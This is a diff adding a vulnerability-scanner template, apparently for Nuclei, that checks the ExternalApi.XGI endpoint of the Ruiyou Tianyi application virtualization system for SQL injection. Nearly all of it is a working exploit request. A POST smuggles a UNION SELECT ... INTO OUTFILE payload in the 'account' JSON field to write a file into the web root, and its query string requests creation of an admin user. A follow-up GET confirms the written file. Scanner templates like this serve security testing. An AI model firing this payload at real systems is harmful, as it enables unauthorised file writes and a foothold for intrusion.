@@ -1,0 +1,45 @@
+id: poc-yaml-gwt-system-externalapi-xgi-sqli
+info:
+  name: 瑞友天翼应用虚拟化系统 ExternalApi.XGI SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the 瑞友天翼应用虚拟化系统 at the ExternalApi.XGI endpoint, allowing for potential data exfiltration and arbitrary file creation.
+
+variables:
+  t1: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /ExternalApi.XGI?key=inner&initParams=command_createUser__user_admin__pwd_password&sign=90286714fbfb1b4396d38e0358216dd1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+
+        {"account":"aaaa' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 into outfile '..\\\\..\\\\WebRoot\\\\{{t1}}.txt'#","userPwd":"bbbb","userGroupId":"1"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "添加用户数据失败"
+
+  - raw:
+      - |
+        GET /{{t1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1\t2\t3\t4\t5\t6\t7\t8\t9\t10\t11\t12\t13\t14\t15\t16\t17\t18\t19\t20\t21\t22\t23\t24\t25\t26\t27\t28\t29\t30\t31\t32"
